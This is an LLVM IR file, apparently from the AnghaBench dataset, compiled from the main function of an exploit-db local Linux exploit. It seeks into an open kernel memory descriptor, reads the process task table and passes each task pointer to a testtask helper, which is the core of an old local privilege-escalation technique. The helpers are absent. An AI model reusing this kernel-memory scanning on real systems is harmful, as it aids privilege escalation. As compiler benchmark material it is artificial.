; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19254.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19254.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.task_struct = type { i32 }

@NR_TASKS = common dso_local global i32 0, align 4
@KSTAT = common dso_local global i32 0, align 4
@mem_fd = common dso_local global i32 0, align 4
@mypid = common dso_local global i32 0, align 4
@SEEK_SET = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = load i32, i32* @NR_TASKS, align 4
  %7 = zext i32 %6 to i64
  %8 = call i8* @llvm.stacksave()
  store i8* %8, i8** %3, align 8
  %9 = alloca %struct.task_struct*, i64 %7, align 16
  store i64 %7, i64* %4, align 8
  %10 = load i32, i32* @KSTAT, align 4
  %11 = load i32, i32* @NR_TASKS, align 4
  %12 = mul nsw i32 %11, 4
  %13 = sub nsw i32 %10, %12
  store i32 %13, i32* %5, align 4
  store i32 3, i32* @mem_fd, align 4
  %14 = call i32 (...) @getpid()
  store i32 %14, i32* @mypid, align 4
  %15 = load i32, i32* @mem_fd, align 4
  %16 = load i32, i32* %5, align 4
  %17 = load i32, i32* @SEEK_SET, align 4
  %18 = call i32 @lseek(i32 %15, i32 %16, i32 %17)
  %19 = load i32, i32* @mem_fd, align 4
  %20 = load i32, i32* @NR_TASKS, align 4
  %21 = mul nsw i32 %20, 4
  %22 = call i32 @read(i32 %19, %struct.task_struct** %9, i32 %21)
  store i32 0, i32* %2, align 4
  br label %23

23:                                               ; preds = %41, %0
  %24 = load i32, i32* %2, align 4
  %25 = load i32, i32* @NR_TASKS, align 4
  %26 = icmp ult i32 %24, %25
  br i1 %26, label %27, label %44

27:                                               ; preds = %23
  %28 = load i32, i32* %2, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds %struct.task_struct*, %struct.task_struct** %9, i64 %29
  %31 = load %struct.task_struct*, %struct.task_struct** %30, align 8
  %32 = icmp ne %struct.task_struct* %31, null
  br i1 %32, label %33, label %40

33:                                               ; preds = %27
  %34 = load i32, i32* %2, align 4
  %35 = zext i32 %34 to i64
  %36 = getelementptr inbounds %struct.task_struct*, %struct.task_struct** %9, i64 %35
  %37 = load %struct.task_struct*, %struct.task_struct** %36, align 8
  %38 = ptrtoint %struct.task_struct* %37 to i32
  %39 = call i32 @testtask(i32 %38)
  br label %40

40:                                               ; preds = %33, %27
  br label %41

41:                                               ; preds = %40
  %42 = load i32, i32* %2, align 4
  %43 = add i32 %42, 1
  store i32 %43, i32* %2, align 4
  br label %23

44:                                               ; preds = %23
  %45 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %45)
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @getpid(...) #2

declare dso_local i32 @lseek(i32, i32, i32) #2

declare dso_local i32 @read(i32, %struct.task_struct**, i32) #2

declare dso_local i32 @testtask(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
